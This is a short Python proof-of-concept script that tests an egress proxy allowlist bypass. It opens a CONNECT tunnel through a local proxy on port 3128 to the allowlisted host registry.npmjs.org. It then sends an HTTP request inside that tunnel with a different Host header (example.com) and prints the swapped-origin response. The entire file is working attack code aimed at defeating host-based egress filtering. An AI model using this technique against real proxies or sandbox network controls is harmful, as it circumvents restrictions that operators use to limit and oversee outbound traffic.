#!/usr/bin/env python3
import socket, time
s = socket.create_connection(("127.0.0.1", 3128), timeout=8)
# stage 1: CONNECT naming the allowlisted host, matching Host header
s.sendall(b"CONNECT registry.npmjs.org:80 HTTP/1.1\r\nHost: registry.npmjs.org:80\r\n\r\n")
print("tunnel:", s.recv(64))
# stage 2: inside the tunnel, speak HTTP to a DIFFERENT origin
s.sendall(b"GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n")
time.sleep(1.5)
out = b""
try:
    while len(out) < 400:
        b = s.recv(400 - len(out))
        if not b:
            break
        out += b
except socket.timeout:
    pass
print("swapped-origin response:", out[:300])
